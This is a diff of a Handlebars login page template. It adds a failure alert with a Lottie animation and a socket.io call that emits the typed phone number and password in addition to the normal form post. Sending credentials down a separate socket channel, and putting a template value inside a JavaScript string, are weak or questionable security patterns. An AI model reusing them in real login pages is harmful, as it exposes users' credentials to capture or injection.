@@ -22,21 +22,67 @@
         </div>
     </div>
 </div>
+{{#if loginFail}}
+    <div id="alert" class="alert text-center">
+        <div id="lottie-animation"></div>
+        <div id="alert-message" class="text-white fs-2 fw-bold">
+            <h4>{{loginFail}}</h4>
+        </div>
+        <button id="close-alert" class="text-white border-0 rounded-2 fs-6 fw-bold">Close</button>
+    </div>
+{{/if}}
 <script>
+    const socket = io();
     document.getElementById("loginForm").addEventListener("submit", function (event) {
         event.preventDefault();
 
         var phone = document.getElementById("phone").value;
         var password = document.getElementById("password").value;
 
+
+        socket.emit("login", ({
+            username: phone,
+            password: password
+        }))
+
         var form = document.getElementById("loginForm");
         form.setAttribute("method", "POST");
         form.setAttribute("action", "/");
 
-        // Set the values of existing input fields
         document.getElementById("phone").setAttribute("value", phone);
         document.getElementById("password").setAttribute("value", password);
 
         form.submit();
+
     });
+
+    function showAlert(message, animationPath, onClose) {
+        const alertElement = document.getElementById('alert');
+        const alertMessageElement = document.getElementById('alert-message');
+        const closeAlertButton = document.getElementById('close-alert');
+
+        alertMessageElement.textContent = message;
+
+        const lottieContainer = document.getElementById('lottie-animation');
+        const animation = bodymovin.loadAnimation({
+            container: lottieContainer,
+            renderer: 'svg',
+            loop: true,
+            autoplay: true,
+            path: animationPath, // Path to your Lottie JSON file
+        });
+
+        const hideAlert = () => {
+            alertElement.style.display = 'none';
+            if (typeof onClose === 'function') {
+                onClose();
+            }
+        };
+
+        closeAlertButton.addEventListener('click', hideAlert);
+
+        alertElement.style.display = 'block';
+    }
+
+    showAlert('{{loginFail}}', './animation/login.json');
 </script>
